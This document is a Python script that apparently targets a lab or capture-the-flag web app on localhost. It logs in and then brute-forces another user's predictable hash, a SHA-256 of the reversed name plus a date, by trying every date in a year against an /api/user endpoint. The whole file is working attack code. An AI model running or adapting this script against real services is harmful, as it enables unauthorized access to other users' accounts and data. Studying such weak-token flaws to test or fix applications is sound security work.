#!/usr/bin/env python3
"""
Brute-force user hash generator and tester.

Usage:
    python3 script.py -e "three@exploit.se" -p "Passw0rd\!" -n "First Last" -y 2025 [-v]
"""

import requests
import hashlib
from datetime import datetime, timedelta
import argparse

# Constants
LOGIN_URL = "http://localhost:8081/api/login"
USER_REQUEST_URL = "http://localhost:8081/api/user"
HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
}


def login(email: str, password: str) -> requests.Session | None:
    """
    Attempt to log in and return a session if successful.
    """
    session = requests.Session()
    try:
        response = session.post(
            LOGIN_URL,
            data={"email": email, "password": password},
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        if response.status_code == 200:
            print("[+] Logged in successfully!")
            return session
        print(f"[!] Login failed: {response.status_code}")
    except requests.RequestException as e:
        print(f"[!] Login error: {e}")
    return None


def generate_user_hash(firstname: str, lastname: str, date_str: str) -> str:
    """
    Generate a SHA-256 hash from reversed name and date.
    """
    raw_string = (firstname + lastname)[::-1] + date_str
    return hashlib.sha256(raw_string.encode("utf-8")).hexdigest()


def send_user_request(session: requests.Session, user_hash: str) -> requests.Response | None:
    """
    Send the user_hash to the /api/user endpoint.
    """
    try:
        response = session.post(
            USER_REQUEST_URL,
            json={"user_hash": user_hash},
            headers=HEADERS
        )
        if response.status_code == 200:
            return response
    except requests.RequestException:
        pass
    return None


def brute_force(
    firstname: str,
    lastname: str,
    year: int,
    session: requests.Session,
    verbose: bool = False
) -> None:
    """
    Brute-force user hashes by iterating over every date in the specified year.
    """
    print(f"[*] Brute-forcing hashes for {firstname} {lastname} for the year {year}...")
    start_date = datetime(year, 1, 1)
    end_date = datetime(year, 12, 31)

    for day_offset in range((end_date - start_date).days + 1):
        current_date = start_date + timedelta(days=day_offset)
        date_str = current_date.strftime("%d%m%Y")
        user_hash = generate_user_hash(firstname, lastname, date_str)

        if verbose:
            print(f"[!] Testing {date_str} → {user_hash}")

        response = send_user_request(session, user_hash)
        if response:
            print(f"[+] Found valid hash for {firstname} {lastname} on {date_str}!")
            print("Response:", response.json())
            break


def main() -> None:
    """
    Parse CLI arguments and initiate brute-force logic.
    """
    parser = argparse.ArgumentParser(description="Brute-force user hash generation.")
    parser.add_argument("-e", "--email", required=True, help="Login email address")
    parser.add_argument("-p", "--password", required=True, help="Login password")
    parser.add_argument("-n", "--name", required=True, help="Full name (e.g. 'Ada Lovelace')")
    parser.add_argument("-y", "--year", type=int, required=True, help="Year to test")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")

    args = parser.parse_args()

    try:
        firstname, lastname = args.name.strip().split()
    except ValueError:
        print("[!] Name must contain exactly two parts: 'Firstname Lastname'")
        return

    session = login(args.email, args.password)
    if session:
        brute_force(firstname, lastname, args.year, session, args.verbose)


if __name__ == "__main__":
    main()
